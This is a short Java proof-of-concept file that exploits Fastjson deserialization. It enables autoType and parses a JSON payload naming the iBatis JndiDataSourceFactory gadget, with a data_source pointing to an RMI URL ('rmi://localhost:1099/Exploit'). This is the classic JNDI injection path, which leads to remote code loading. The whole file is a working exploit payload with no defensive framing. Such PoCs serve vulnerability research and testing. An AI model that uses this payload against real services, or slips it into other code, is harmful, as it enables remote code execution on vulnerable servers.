package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Created by liaoxinxi on 2018-4-24.
 */
public class IbatisJNDIPoC {
    public static void main(String[] argv) {
        //testUnicode();
        testJndiDataSourceFactory();
    }

    public static void testJndiDataSourceFactory() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}";
        JSON.parse(payload);
    }
}
